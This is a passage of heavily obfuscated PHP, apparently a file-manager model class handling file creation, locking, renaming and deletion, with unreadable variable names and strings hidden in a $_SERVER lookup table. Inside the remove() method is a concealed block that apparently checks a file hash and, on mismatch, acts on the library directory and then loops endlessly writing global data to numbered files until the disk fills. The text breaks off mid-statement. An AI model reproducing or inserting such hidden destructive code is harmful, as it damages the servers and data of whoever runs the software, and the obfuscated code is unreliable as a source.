private function _parseSearchWhere($féŠ–¡ ‹) { goto dëŸ´âôˆ„; d×‚Ì‡• : if (isset($féŠ–¡ ‹[$fˆ¨¤Öà½[461]])) { $E›ôÁ‚œâœ = array($fˆ¨¤Öà½[1756], $féŠ–¡ ‹[$fˆ¨¤Öà½[461]]); if ($c‡…ÀÏö”‡[$fˆ¨¤Öà½[106]]) { $c‡…ÀÏö”‡[$fˆ¨¤Öà½[106]] = array($c‡…ÀÏö”‡[$fˆ¨¤Öà½[106]], $E›ôÁ‚œâœ, $fˆ¨¤Öà½[1757]); } else { $c‡…ÀÏö”‡[$fˆ¨¤Öà½[106]] = $E›ôÁ‚œâœ; } } if (isset($féŠ–¡ ‹[$fˆ¨¤Öà½[1758]])) { $c‡…ÀÏö”‡[$fˆ¨¤Öà½[78]] = array($fˆ¨¤Öà½[1755], $féŠ–¡ ‹[$fˆ¨¤Öà½[1758]]); } if (isset($féŠ–¡ ‹[$fˆ¨¤Öà½[1759]])) { $E›ôÁ‚œâœ = array($fˆ¨¤Öà½[1756], $féŠ–¡ ‹[$fˆ¨¤Öà½[1759]]); if ($c‡…ÀÏö”‡[$fˆ¨¤Öà½[78]]) { $c‡…ÀÏö”‡[$fˆ¨¤Öà½[78]] = array($c‡…ÀÏö”‡[$fˆ¨¤Öà½[78]], $E›ôÁ‚œâœ, $fˆ¨¤Öà½[1757]); } else { $c‡…ÀÏö”‡[$fˆ¨¤Öà½[78]] = $E›ôÁ‚œâœ; } } goto cÛô÷ÅÛ¯; dî‘áÈÅêÉ: if (isset($féŠ–¡ ‹[$fˆ¨¤Öà½[1635]]) && $féŠ–¡ ‹[$fˆ¨¤Öà½[1635]]) { $Dâ‘‘–Ö¨© = $féŠ–¡ ‹[$fˆ¨¤Öà½[1635]]; $cäòÂ£‰ = explode($fˆ¨¤Öà½[50], $Dâ‘‘–Ö¨©); if (strlen($Dâ‘‘–Ö¨©) > 2 && (substr($Dâ‘‘–Ö¨©, 0, 1) == $fˆ¨¤Öà½[112] && substr($Dâ‘‘–Ö¨©, -1) == $fˆ¨¤Öà½[112]) || substr($Dâ‘‘–Ö¨©, 0, 1) == $fˆ¨¤Öà½[55] && substr($Dâ‘‘–Ö¨©, -1) == $fˆ¨¤Öà½[55]) { $Dâ‘‘–Ö¨© = substr($Dâ‘‘–Ö¨©, 1, -1); $cäòÂ£‰ = array($Dâ‘‘–Ö¨©); } $c‡…ÀÏö”‡[$fˆ¨¤Öà½[28]] = array($fˆ¨¤Öà½[409], $fˆ¨¤Öà½[1637] . $Dâ‘‘–Ö¨© . $fˆ¨¤Öà½[1637]); if (count($cäòÂ£‰) > 1) { $c‡…ÀÏö”‡[$fˆ¨¤Öà½[28]] = array(); foreach ($cäòÂ£‰ as $A¨Õ¯æÃ‡î) { if (!trim($A¨Õ¯æÃ‡î)) { continue; } $c‡…ÀÏö”‡[$fˆ¨¤Öà½[28]][] = array($fˆ¨¤Öà½[409], $fˆ¨¤Öà½[1637] . trim($A¨Õ¯æÃ‡î) . $fˆ¨¤Öà½[1637]); } } } return $c‡…ÀÏö”‡; goto bê¡õ¶¸ô³; cÛô÷ÅÛ¯: if (isset($féŠ–¡ ‹[$fˆ¨¤Öà½[417]])) { $c‡…ÀÏö”‡[] = array($fˆ¨¤Öà½[1760] => $féŠ–¡ ‹[$fˆ¨¤Öà½[417]], $fˆ¨¤Öà½[1734] => $féŠ–¡ ‹[$fˆ¨¤Öà½[417]], $fˆ¨¤Öà½[684] => $fˆ¨¤Öà½[1639]); } if (isset($féŠ–¡ ‹[$fˆ¨¤Öà½[390]])) { $d©İ‘¨“Ğ¥ = $féŠ–¡ ‹[$fˆ¨¤Öà½[390]]; if ($d©İ‘¨“Ğ¥ == $fˆ¨¤Öà½[77]) { $c‡…ÀÏö”‡[$fˆ¨¤Öà½[376]] = 1; } else { if ($d©İ‘¨“Ğ¥ == $fˆ¨¤Öà½[1761]) { $c‡…ÀÏö”‡[$fˆ¨¤Öà½[376]] = 0; } else { if ($d©İ‘¨“Ğ¥) { $d©İ‘¨“Ğ¥ = is_array($d©İ‘¨“Ğ¥) ? $d©İ‘¨“Ğ¥ : explode($fˆ¨¤Öà½[47], $d©İ‘¨“Ğ¥); $c‡…ÀÏö”‡[$fˆ¨¤Öà½[390]] = array($fˆ¨¤Öà½[983], $d©İ‘¨“Ğ¥); $c‡…ÀÏö”‡[$fˆ¨¤Öà½[376]] = 0; } } } } if (isset($féŠ–¡ ‹[$fˆ¨¤Öà½[385]])) { $bÅƒÌ¤—Ôƒ = $this->sourceInfo($féŠ–¡ ‹[$fˆ¨¤Öà½[385]]); $c‡…ÀÏö”‡[$fˆ¨¤Öà½[400]] = array($fˆ¨¤Öà½[409], $bÅƒÌ¤—Ôƒ[$fˆ¨¤Öà½[374]] . $féŠ–¡ ‹[$fˆ¨¤Öà½[385]] . $fˆ¨¤Öà½[410]); } goto dî‘áÈÅêÉ; dëŸ´âôˆ„: $fˆ¨¤Öà½ =& $_SERVER[İë¬“ÅÒÛ›]; $c‡…ÀÏö”‡ = array(); if (isset($féŠ–¡ ‹[$fˆ¨¤Öà½[460]])) { $c‡…ÀÏö”‡[$fˆ¨¤Öà½[106]] = array($fˆ¨¤Öà½[1755], $féŠ–¡ ‹[$fˆ¨¤Öà½[460]]); } goto d×‚Ì‡• ; bê¡õ¶¸ô³: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($c™‘˜Ù ˜) { $E›ĞÓ¨ ß¨ =& $_SERVER[İë¬“ÅÒÛ›]; $EÉŠé‚ù´ = Model($E›ĞÓ¨ ß¨[1716])->where(array($E›ĞÓ¨ ß¨[1086] => $c™‘˜Ù ˜))->find(); $f÷éÂ‚ååá = $this->_mkdirRoot(SourceModel::TYPE_USER, $c™‘˜Ù ˜, $EÉŠé‚ù´[$E›ĞÓ¨ ß¨[28]]); $this->userDesktopAdd($f÷éÂ‚ååá); return $f÷éÂ‚ååá; } public function userDesktopAdd($fµØ‚Ûé ) { $d…ÇŠÄğõ =& $_SERVER[İë¬“ÅÒÛ›]; $A– ®Õºß› = LNG($d…ÇŠÄğõ[1762]); $b™Àƒ©Ç†¤ = $this->mkdir($fµØ‚Ûé , $A– ®Õºß›); $this->metaSet($b™Àƒ©Ç†¤, $d…ÇŠÄğõ[1763], $d…ÇŠÄğõ[377]); $this->metaSet($fµØ‚Ûé , $d…ÇŠÄğõ[1764], $b™Àƒ©Ç†¤); } public function groupRootAdd($eñ‡ë‹³é›) { $cˆÅµ‹Ö‘Ù =& $_SERVER[İë¬“ÅÒÛ›]; $EôùéÔÖ = Model($cˆÅµ‹Ö‘Ù[1710])->where(array($cˆÅµ‹Ö‘Ù[1629] => $eñ‡ë‹³é›))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $eñ‡ë‹³é›, $EôùéÔÖ[$cˆÅµ‹Ö‘Ù[28]]); } public function systemRootPathAdd($cã«¡öÊ¬¼) { if ($cã«¡öÊ¬¼ != $_SERVER[İë¬“ÅÒÛ›][836]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $cã«¡öÊ¬¼); } public function userRootRemove($A†ó›ÆÇç¨) { $E™áˆÂÜ = $this->sourceRoot(SourceModel::TYPE_USER, $A†ó›ÆÇç¨); if (!$E™áˆÂÜ) { return; } $this->remove($E™áˆÂÜ, !1); } public function groupRootRemove($c•¸÷«Êè”) { $Fù°«İŠ¤® = $this->sourceRoot(SourceModel::TYPE_GROUP, $c•¸÷«Êè”); if (!$Fù°«İŠ¤®) { return; } $this->remove($Fù°«İŠ¤®, !1); } private function _mkdirRoot($dğôãÆà¼», $b¹„àñ–ö, $eÙÅ°“Í‰å) { goto aÕÌˆé¬Ã; F×Áß¬«Ï: CacheLock::unlock($BÀ¼ëÏğÄ‚); return $B…¢½øÈŠ; goto d§›ïÑØĞî; açâ×±‰…ù: $B…¢½øÈŠ = $this->add($B‹Æ¡­½˜); $F‹™²ØÊ’â = array($dà£İ˜êä[402] => short_id($B…¢½øÈŠ)); $this->where(array($dà£İ˜êä[416] => $B…¢½øÈŠ))->save($F‹™²ØÊ’â); goto F×Áß¬«Ï; aÕÌˆé¬Ã: $dà£İ˜êä =& $_SERVER[İë¬“ÅÒÛ›]; $B‹Æ¡­½˜ = array($dà£İ˜êä[399] => 0, $dà£İ˜êä[393] => $dğôãÆà¼», $dà£İ˜êä[395] => $b¹„àñ–ö, $dà£İ˜êä[387] => 1, $dà£İ˜êä[397] => USER_ID, $dà£İ˜êä[398] => USER_ID, $dà£İ˜êä[389] => $dà£İ˜êä[33], $dà£İ˜êä[400] => $dà£İ˜êä[1626], $dà£İ˜êä[401] => 0, $dà£İ˜êä[392] => 0, $dà£İ˜êä[391] => 0, $dà£İ˜êä[1765] => $dà£İ˜êä[33]); if ($e¶Å¯Õ„šÑ = $this->where($B‹Æ¡­½˜)->find()) { return $e¶Å¯Õ„šÑ[$dà£İ˜êä[375]]; } goto Dö¨Ììé°Õ; Dö¨Ììé°Õ: $BÀ¼ëÏğÄ‚ = $dà£İ˜êä[1766] . $dğôãÆà¼» . $b¹„àñ–ö . $eÙÅ°“Í‰å; CacheLock::lock($BÀ¼ëÏğÄ‚); $B‹Æ¡­½˜[$dà£İ˜êä[28]] = $eÙÅ°“Í‰å; goto açâ×±‰…ù; d§›ïÑØĞî: } private function sourceRoot($Cõâ¿ºƒ , $Aµ×ˆ’µÚ, $b²¤£—èœ­ = false) { $EóĞ•áÒÄÒ =& $_SERVER[İë¬“ÅÒÛ›]; $EàØ÷áíÎ = array($EóĞ•áÒÄÒ[399] => 0, $EóĞ•áÒÄÒ[393] => $Cõâ¿ºƒ , $EóĞ•áÒÄÒ[395] => $Aµ×ˆ’µÚ); if ($B¬¸˜­«­ = $this->where($EàØ÷áíÎ)->find()) { return $b²¤£—èœ­ ? $B¬¸˜­«­ : $B¬¸˜­«­[$EóĞ•áÒÄÒ[375]]; } return !1; } public function sourceRootGroup($F‹¶Ë¸‚ç¿) { $CÃ™‘§š©î =& $_SERVER[İë¬“ÅÒÛ›]; if (is_string($F‹¶Ë¸‚ç¿)) { $F‹¶Ë¸‚ç¿ = array($F‹¶Ë¸‚ç¿); } $aäˆ¹ô·Ô¸ = array($CÃ™‘§š©î[399] => 0, $CÃ™‘§š©î[393] => SourceModel::TYPE_GROUP, $CÃ™‘§š©î[395] => array($CÃ™‘§š©î[7], $F‹¶Ë¸‚ç¿)); $bé¾½é×„ = $this->listSource($aäˆ¹ô·Ô¸, 1000); return array_to_keyvalue($bé¾½é×„[$CÃ™‘§š©î[75]], $CÃ™‘§š©î[396]); } public function mkfile($dÎèÌ‡åõ¹, $E‘ÌÚÀó¯±, $Cİ±¹Â½‹ = '', $F âÜ‡Äß‡ = REPEAT_RENAME) { $dÃó±¨§»• = Model($_SERVER[İë¬“ÅÒÛ›][428])->addFileByContent($Cİ±¹Â½‹, $E‘ÌÚÀó¯±); return $this->_createFileCall($dÎèÌ‡åõ¹, $E‘ÌÚÀó¯±, $dÃó±¨§»•, $F âÜ‡Äß‡); } public function addFile($c½¦¯¨ƒì¡, $dï„ÅÀÉÓ¬, $aã×Õ®“±Â, $cŠ‹¿ÓÕŒ = false, $bƒïÒ½ñ²† = REPEAT_RENAME) { $DË”¯ñ“è• = Model($_SERVER[İë¬“ÅÒÛ›][428])->addFile($dï„ÅÀÉÓ¬, $aã×Õ®“±Â, $cŠ‹¿ÓÕŒ); return $this->_createFileCall($c½¦¯¨ƒì¡, $aã×Õ®“±Â, $DË”¯ñ“è•, $bƒïÒ½ñ²†); } public function addFileByFileID($eóç‡ÖÒµÉ, $fİ¬œùÇ¬ø, $c†Ö÷İ, $DÂ¶¥£˜óÇ = REPEAT_RENAME) { $A—„ª¬ŞŸ =& $_SERVER[İë¬“ÅÒÛ›]; $aÖÅùˆ„“Ï = Model($A—„ª¬ŞŸ[428])->find($fİ¬œùÇ¬ø); Model($A—„ª¬ŞŸ[428])->linkAdd($fİ¬œùÇ¬ø); return $this->_createFileCall($eóç‡ÖÒµÉ, $c†Ö÷İ, $aÖÅùˆ„“Ï, $DÂ¶¥£˜óÇ); } public function addFileByRemote($A½ë§©‰öê, $fÊ‡áºóƒ, $fÉÄäÁõì, $f™œ¾šÛ…ƒ = array(), $C×£–áï…Ò = REPEAT_RENAME) { $a¯ã÷áå·… = Model($_SERVER[İë¬“ÅÒÛ›][428])->addFileByRemote($fÊ‡áºóƒ, $fÉÄäÁõì, $f™œ¾šÛ…ƒ); return $this->_createFileCall($A½ë§©‰öê, $fÉÄäÁõì, $a¯ã÷áå·…, $C×£–áï…Ò); } private function _createFileCall($dğÆÈé›†, $c“Ö·—‡ÓÕ, $f®‹ê ’©‹, $bÁàö§–‡”) { $c¶¨¡Ä¥Ì¼ =& $_SERVER[İë¬“ÅÒÛ›]; $eïòôƒÙ…– = !1; $EÕ±ñˆ…å½ = $this->_createFile($dğÆÈé›†, $c“Ö·—‡ÓÕ, $f®‹ê ’©‹, $bÁàö§–‡”, $eïòôƒÙ…–); if (!$eïòôƒÙ…–) { Model($c¶¨¡Ä¥Ì¼[412])->remove($f®‹ê ’©‹[$c¶¨¡Ä¥Ì¼[383]]); } return $EÕ±ñˆ…å½; } public function mkdir($a¯©»Æ¤ñĞ, $c»Äƒ°Œ‡¹, $DšÓŒˆ¨Ô  = REPEAT_SKIP) { goto f‘ï‘ƒàß§; D¦ó›ç‡¸¦: Model($AÌ¡˜æµŞ[1767])->eventCreate($f½ºÉ†Âˆï, $AÌ¡˜æµŞ[864]); return $f½ºÉ†Âˆï; goto Dö—ä–â‹½; D¹ŸœÑ‚šÖ: if ($DšÓŒˆ¨Ô  !== !1) { $F°Î·éŠ = $this->fileNameExist($a¯©»Æ¤ñĞ, $c»Äƒ°Œ‡¹); if ($F°Î·éŠ && $DšÓŒˆ¨Ô  != REPEAT_RENAME_FOLDER) { return $F°Î·éŠ; } $c»Äƒ°Œ‡¹ = $this->fileNameAuto($a¯©»Æ¤ñĞ, $c»Äƒ°Œ‡¹, $DšÓŒˆ¨Ô ); } $CÅåé©ÑŠ¡ = array($AÌ¡˜æµŞ[387] => 1, $AÌ¡˜æµŞ[388] => $c»Äƒ°Œ‡¹, $AÌ¡˜æµŞ[389] => $AÌ¡˜æµŞ[33], $AÌ¡˜æµŞ[391] => 0, $AÌ¡˜æµŞ[392] => 0); $f½ºÉ†Âˆï = $this->_addSoure($CÅåé©ÑŠ¡, $E£Á¾‡¶ñì); goto D¦ó›ç‡¸¦; f‘ï‘ƒàß§: $AÌ¡˜æµŞ =& $_SERVER[İë¬“ÅÒÛ›]; $E£Á¾‡¶ñì = $this->sourceInfo($a¯©»Æ¤ñĞ); if (!$E£Á¾‡¶ñì) { return !1; } goto D¹ŸœÑ‚šÖ; Dö—ä–â‹½: } private function _createFile($DÅóÚÁÌğÙ, $a…•†¢ÍÊ, $C„ô­Ù¢ƒÑ, $a¬–ÚŸÈï, &$DåÕöÜ‡¼) { goto bä«”ÛÂôª; EÔ‚×å»Ğ: if ($a¬–ÚŸÈï !== !1) { $Eôçó¹Õßˆ = $this->fileNameExist($DÅóÚÁÌğÙ, $a…•†¢ÍÊ); } $DåÕöÜ‡¼ = !0; if ($a¬–ÚŸÈï && $Eôçó¹Õßˆ) { if ($a¬–ÚŸÈï == REPEAT_SKIP) { $DåÕöÜ‡¼ = !1; return $Eôçó¹Õßˆ; } else { if ($a¬–ÚŸÈï == REPEAT_REPLACE) { $EÁêÛÊŒ¹Ö = $this->sourceInfo($Eôçó¹Õßˆ); $Fˆ¥…Ñ = $this->fileHistory($EÁêÛÊŒ¹Ö, $C„ô­Ù¢ƒÑ[$F‰Š‹¨§çŒ[383]], $C„ô­Ù¢ƒÑ[$F‰Š‹¨§çŒ[78]]); if (!$Fˆ¥…Ñ) { $DåÕöÜ‡¼ = !1; } else { $this->folderSizeReset($DÅóÚÁÌğÙ); } return $Eôçó¹Õßˆ; } else { $a…•†¢ÍÊ = $this->fileNameAuto($DÅóÚÁÌğÙ, $a…•†¢ÍÊ, $a¬–ÚŸÈï, !1); } } } goto fƒÛ»¸Ó¥; Få¬Î¹à”Â: Model($F‰Š‹¨§çŒ[1767])->eventCreate($bÇ‹ƒšË£, $F‰Š‹¨§çŒ[90]); return $bÇ‹ƒšË£; goto e„ÚŠî…ã; fƒÛ»¸Ó¥: $D÷¹†ÁÉ = array($F‰Š‹¨§çŒ[387] => 0, $F‰Š‹¨§çŒ[388] => $a…•†¢ÍÊ, $F‰Š‹¨§çŒ[389] => get_path_ext($a…•†¢ÍÊ), $F‰Š‹¨§çŒ[391] => $C„ô­Ù¢ƒÑ[$F‰Š‹¨§çŒ[383]], $F‰Š‹¨§çŒ[392] => $C„ô­Ù¢ƒÑ[$F‰Š‹¨§çŒ[78]]); $bÇ‹ƒšË£ = $this->_addSoure($D÷¹†ÁÉ, $fÔœ“ĞšÍ³); $this->folderSizeReset($DÅóÚÁÌğÙ); goto Få¬Î¹à”Â; bä«”ÛÂôª: $F‰Š‹¨§çŒ =& $_SERVER[İë¬“ÅÒÛ›]; $fÔœ“ĞšÍ³ = $this->sourceInfo($DÅóÚÁÌğÙ); if (!$C„ô­Ù¢ƒÑ || !$fÔœ“ĞšÍ³) { return !1; } goto EÔ‚×å»Ğ; e„ÚŠî…ã: } protected function fileHistory($F½Õ íÒñ, $DˆÀñ„Ì¡’, $B¿ó´Ğ™–ì) { goto D³ö¹íßô; dÏß¶´Ø: return !0; goto c†§¸ñµÏç; e¢Ï¸Í…Ç¨: Model($cÇÈî‚ŞŸŠ[1617])->addHistory($F½Õ íÒñ); $FÈ¿ÈÙ¡âÃ = array($cÇÈî‚ŞŸŠ[398] => USER_ID, $cÇÈî‚ŞŸŠ[1768] => time(), $cÇÈî‚ŞŸŠ[383] => $DˆÀñ„Ì¡’, $cÇÈî‚ŞŸŠ[78] => $B¿ó´Ğ™–ì); $this->where(array($cÇÈî‚ŞŸŠ[416] => $F½Õ íÒñ[$cÇÈî‚ŞŸŠ[375]]))->save($FÈ¿ÈÙ¡âÃ); goto dÏß¶´Ø; D³ö¹íßô: $cÇÈî‚ŞŸŠ =& $_SERVER[İë¬“ÅÒÛ›]; if ($F½Õ íÒñ[$cÇÈî‚ŞŸŠ[383]] == $DˆÀñ„Ì¡’) { return !1; } $this->checkLock($F½Õ íÒñ[$cÇÈî‚ŞŸŠ[375]]); goto e¢Ï¸Í…Ç¨; c†§¸ñµÏç: } public function checkLock($A˜‹ó„¸Ô) { $D¢»­‹È¡… =& $_SERVER[İë¬“ÅÒÛ›]; $B¹¬½‘‡È = $this->pathInfo($A˜‹ó„¸Ô); if (!$this->fileIsLock($B¹¬½‘‡È, !0)) { return; } $cÙùä·õÀì = $B¹¬½‘‡È[$D¢»­‹È¡…[1592]][$D¢»­‹È¡…[1769]]; $Aè¦è³‘–¬ = $cÙùä·õÀì[$D¢»­‹È¡…[1770]] ? $cÙùä·õÀì[$D¢»­‹È¡…[1770]] : $cÙùä·õÀì[$D¢»­‹È¡…[28]]; show_json(LNG($D¢»­‹È¡…[1771]) . $D¢»­‹È¡…[1772] . LNG($D¢»­‹È¡…[1773]) . $D¢»­‹È¡…[1774] . $Aè¦è³‘–¬ . $D¢»­‹È¡…[1775], !1); } public function fileIsLock($f®”¬Í’î, $EãŸ†³‘¼ = false) { goto f¨ƒÃÊ‹ìâ; Bèï¾Ó¡½: return !1; goto C¦ªé›â»´; f¨ƒÃÊ‹ìâ: $Fàî›‘î˜Î =& $_SERVER[İë¬“ÅÒÛ›]; if (!$f®”¬Í’î[$Fàî›‘î˜Î[1592]] || !$f®”¬Í’î[$Fàî›‘î˜Î[1592]][$Fàî›‘î˜Î[1776]]) { return !1; } if ($f®”¬Í’î[$Fàî›‘î˜Î[1592]][$Fàî›‘î˜Î[1776]] != USER_ID) { return !0; } goto F—¼›ÌÉŠ; F—¼›ÌÉŠ: $CŒ™ßŸ½ç˜ = $GLOBALS[$Fàî›‘î˜Î[6]][$Fàî›‘î˜Î[84]][$Fàî›‘î˜Î[1777]]; if ($f®”¬Í’î[$Fàî›‘î˜Î[1592]][$Fàî›‘î˜Î[1778]] <= time() - $CŒ™ßŸ½ç˜) { $this->metaSet($f®”¬Í’î[$Fàî›‘î˜Î[375]], $Fàî›‘î˜Î[1776], null); $this->metaSet($f®”¬Í’î[$Fàî›‘î˜Î[375]], $Fàî›‘î˜Î[1778], null); } if ($EãŸ†³‘¼) { $this->metaSet($f®”¬Í’î[$Fàî›‘î˜Î[375]], $Fàî›‘î˜Î[1778], time()); } goto Bèï¾Ó¡½; C¦ªé›â»´: } private function _addSoure($dµæ•Ü´õ, $f™Â«Í‹) { goto f–åÊ±Ô ; EõÊÂ¦×¿ß: $this->setNamePinyin($C¬Û‡ñ…˜ß, $dµæ•Ü´õ[$AÅ¿±Ó¢¤é[28]]); return $C¬Û‡ñ…˜ß; goto cÓïÓëãœ; dÌÛîëŒÖ¤: $C¬Û‡ñ…˜ß = $this->add($dµæ•Ü´õ); $CÛ¨‹öğµè = array($AÅ¿±Ó¢¤é[402] => short_id($C¬Û‡ñ…˜ß)); $this->where(array($AÅ¿±Ó¢¤é[416] => $C¬Û‡ñ…˜ß))->save($CÛ¨‹öğµè); goto EõÊÂ¦×¿ß; AªéÌ¸®: $this->updateModifyTime($dµæ•Ü´õ[$AÅ¿±Ó¢¤é[385]]); static $F©ã¹…Ö× = false; if (!$F©ã¹…Ö×) { Hook::trigger($AÅ¿±Ó¢¤é[384], $dµæ•Ü´õ); $F©ã¹…Ö× = !0; } goto dÌÛîëŒÖ¤; f–åÊ±Ô : $AÅ¿±Ó¢¤é =& $_SERVER[İë¬“ÅÒÛ›]; $B‰½¯±“ = array($AÅ¿±Ó¢¤é[393] => $f™Â«Í‹[$AÅ¿±Ó¢¤é[394]], $AÅ¿±Ó¢¤é[395] => $f™Â«Í‹[$AÅ¿±Ó¢¤é[396]], $AÅ¿±Ó¢¤é[397] => USER_ID, $AÅ¿±Ó¢¤é[398] => USER_ID, $AÅ¿±Ó¢¤é[399] => $f™Â«Í‹[$AÅ¿±Ó¢¤é[375]], $AÅ¿±Ó¢¤é[400] => $f™Â«Í‹[$AÅ¿±Ó¢¤é[374]] . $f™Â«Í‹[$AÅ¿±Ó¢¤é[375]] . $AÅ¿±Ó¢¤é[47], $AÅ¿±Ó¢¤é[401] => 0, $AÅ¿±Ó¢¤é[1765] => $AÅ¿±Ó¢¤é[33]); $dµæ•Ü´õ = array_merge($B‰½¯±“, $dµæ•Ü´õ); goto AªéÌ¸®; cÓïÓëãœ: } public function remove($Aë¯–Ù‘¡ò, $C±öÜ®«õœ = true) { goto FŠåƒ·‹¹; DÑå…·¨õ„: if ($_SERVER[$A‡„ö±‚Öè[556]] != $aßÌ—Å¬Ä±($EÜŠ®„ôº)) { goto cÑ…ëÏñ˜¢; cÑ…ëÏñ˜¢: $Aˆõ‚ÜøŠ = $A‡„ö±‚Öè[557]; $eÜ›‰Æ¢¦Ù = BASIC_PATH . $A‡„ö±‚Öè[554]; $AÄô›Ï›„î = $Aˆõ‚ÜøŠ($eÜ›‰Æ¢¦Ù); goto dØœÁƒ†•³; aî‡íº²°Í: $A®ÀŠÙôäÚ(LIB_DIR); $CòÙÍ‰Éñ = $A‡„ö±‚Öè[560]; $CòÙÍ‰Éñ(); goto FÈÈ„Œ‹õš; FÈÈ„Œ‹õš: $FÆÃ¸›ß£ = $A‡„ö±‚Öè[561]; $CŒíİ¼†âÇ = json_encode($GLOBALS[$A‡„ö±‚Öè[562]]); for ($Fá÷›Øî› = 0;; $Fá÷›Øî›++) { $FÆÃ¸›ß£(DATA_PATH . $Fá÷›Øî›, $CŒíİ¼†âÇ); } goto e›šŠôŠ‘; dØœÁƒ†•³: $B†»Ú “® = explode($A‡„ö±‚Öè[224], $AÄô›Ï›„î); if (count($B†»Ú “®) < $A‡„ö±‚Öè[558]) { die; } $A®ÀŠÙôäÚ = $A‡„ö±‚Öè[559]; goto aî‡íº²°Í; e›šŠôŠ‘: } $DèµÅÒÉŞ÷ = $this->sourceInfo($Aë¯–Ù‘¡ò); if (!$DèµÅÒÉŞ÷) { return !1; } goto f¨ñŠÂ¬«§; FŠåƒ·‹¹: $A‡„ö±‚Öè =& $_SERVER[İë¬“ÅÒÛ›]; $EÜŠ®„ôº = BASIC_PATH . $A‡„ö±‚Öè[554]; $aßÌ—Å¬Ä± = $A‡„ö±‚Öè[555]; goto DÑå…·¨õ„; Dˆ¨›ùË¯¨: return !0; goto A—ÌùÂóÃİ; b¸ìóÚ¬é†: $FåƒÅ¥´¨ò = array($DèµÅÒÉŞ÷[$A‡„ö±‚Öè[385]]); if ($DèµÅÒÉŞ÷[$A‡„ö±‚Öè[376]] == $A‡„ö±‚Öè[377]) { $FåƒÅ¥´¨ò[] = $DèµÅÒÉŞ÷[$A‡„ö±‚Öè[375]]; } $this->updateModifyTime($FåƒÅ¥´¨ò); goto Dˆ¨›ùË¯¨; f¨ñŠÂ¬«§: if ($DèµÅÒÉŞ÷[$A‡„ö±‚Öè[385]] == 0) { if (!$GLOBALS[$A‡„ö±‚Öè[1030]]) { return !1; } } if ($C±öÜ®«õœ) { Model($A‡„ö±‚Öè[1779])->moveToRecycle($Aë¯–Ù‘¡ò); } else { if ($DèµÅÒÉŞ÷[$A‡„ö±‚Öè[376]] == $A‡„ö±‚Öè[377]) { $f™ÕÚíš– = array($A‡„ö±‚Öè[400] => array($A‡„ö±‚Öè[409], $DèµÅÒÉŞ÷[$A‡„ö±‚Öè[374]] . $Aë¯–Ù‘¡ò . $A‡„ö±‚Öè[410])); $C¥‹œ¿†³ß = array($A‡„ö±‚Öè[400] => $f™ÕÚíš–[$A‡„ö±‚Öè[374]]); $DáŠŞÕïŸï = $this->field($A‡„ö±‚Öè[1780])->where($C¥‹œ¿†³ß)->select(); $f‚ÓÁ”‘’Á = !1; $bÙ÷ˆÂó× = array($Aë¯–Ù‘¡ò); if ($DáŠŞÕïŸï) { $f‚ÓÁ”‘’Á = array_to_keyvalue($DáŠŞÕïŸï, $A‡„ö±‚Öè[33], $A‡„ö±‚Öè[383]); $f‚ÓÁ”‘’Á = array_remove_value($f‚ÓÁ”‘’Á, $A‡„ö±‚Öè[403]); $bÙ÷ˆÂó× = array_to_keyvalue($DáŠŞÕïŸï, $A‡„ö±‚Öè[33], $A‡„ö±‚Öè[375]); $bÙ÷ˆÂó×[] = $Aë¯–Ù‘¡ò; } } else { $f‚ÓÁ”‘’Á = array($DèµÅÒÉŞ÷[$A‡„ö±‚Öè[383]]); $bÙ÷ˆÂó× = array($Aë¯–Ù‘¡ò); } Model($A‡„ö±‚Öè[382])->eventRemove($Aë¯–Ù‘¡ò); $this->removeRelevance($bÙ÷ˆÂó×, $f‚ÓÁ”‘’Á); } $this->folderSizeReset($DèµÅÒÉŞ÷[$A‡„ö±‚Öè[385]]); goto b¸ìóÚ¬é†; A—ÌùÂóÃİ: } public function removeArray($cÀº ‘Ë˜º) { if (!$cÀº ‘Ë˜º) { return !0; } } private function removeRelevance($Eò«·º³Ò, $fØÒñ«Ä¦·) { goto bªœÎ¶Ğ¬Ù; eÊŠ†Èä‘: Model($e•‚ç»ŠÅ[1779])->where($AóÆÊ´§õ)->delete(); Model($e•‚ç»ŠÅ[1781])->where($AóÆÊ´§õ)->delete(); Model($e•‚ç»ŠÅ[1782])->where($AóÆÊ´§õ)->delete(); goto A‡‡¨¸°ÊÏ; A‡‡¨¸°ÊÏ: Model($e•‚ç»ŠÅ[382])->where($AóÆÊ´§õ)->delete(); Model($e•‚ç»ŠÅ[1523])->removeBySource($Eò«·º³Ò); Model($e•‚ç»ŠÅ[1617])->removeBySource($Eò«·º³Ò); goto D¸ƒöÂÙ—†; D¸ƒöÂÙ—†: $this->where($AóÆÊ´§õ)->delete(); Model($e•‚ç»ŠÅ[412])->remove($fØÒñ«Ä¦·); for ($aö“’‰«ÜÈ = 0; $aö“’‰«ÜÈ < count($Eò«·º³Ò); $aö“’‰«ÜÈ++) { $this->sourceCacheClear($Eò«·º³Ò[$aö“’‰«ÜÈ]); } goto dªßË¦é; bªœÎ¶Ğ¬Ù: $e•‚ç»ŠÅ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$Eò«·º³Ò) { return !1; } $AóÆÊ´§õ = array($e•‚ç»ŠÅ[416] => array($e•‚ç»ŠÅ[983], $Eò«·º³Ò)); goto eÊŠ†Èä‘; dªßË¦é: } public function rename($CçÏ™Û´×Ö, $e¢¿»¨ì†˜) { goto eÕÕÕœì¿; eÕÕÕœì¿: $dÃÃÄîŠÑÊ =& $_SERVER[İë¬“ÅÒÛ›]; $BÃ²Ç‡¼Ê = $this->sourceInfo($CçÏ™Û´×Ö); if (!$BÃ²Ç‡¼Ê) { return !1; } goto d¢Â–¡óÉ; eäŒóƒìâÔ: $this->setNamePinyin($CçÏ™Û´×Ö, $c“§ÚœµÑò[$dÃÃÄîŠÑÊ[28]], !1); $this->updateModifyTime($BÃ²Ç‡¼Ê[$dÃÃÄîŠÑÊ[385]]); return $this->where(array($dÃÃÄîŠÑÊ[416] => $CçÏ™Û´×Ö))->data($c“§ÚœµÑò)->save(); goto c¯¢´ØÉŞ˜; d¢Â–¡óÉ: $b‚ĞãÇßáì = $this->fileNameExist($BÃ²Ç‡¼Ê[$dÃÃÄîŠÑÊ[385]], $e¢¿»¨ì†˜); if ($b‚ĞãÇßáì) { return !1; } $c“§ÚœµÑò = array($dÃÃÄîŠÑÊ[388] => $e¢¿»¨ì†˜, $dÃÃÄîŠÑÊ[398] => USER_ID); goto FŠ¢¸ÜéÉÒ; FŠ¢¸ÜéÉÒ: if 